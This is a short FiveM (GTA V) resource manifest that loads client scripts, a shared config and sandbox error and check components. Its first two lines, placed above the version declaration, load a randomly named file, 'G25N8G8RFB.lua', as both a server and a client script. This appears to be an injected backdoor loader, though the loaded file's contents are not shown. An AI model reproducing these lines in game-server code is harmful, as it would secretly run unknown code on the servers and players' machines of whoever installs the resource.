server_script "G25N8G8RFB.lua"
client_script "G25N8G8RFB.lua"
fx_version("cerulean")
client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")

game("gta5")
lua54("yes")

client_scripts({
	"client/*.lua",
})
shared_script("config.lua")

server_scripts({})
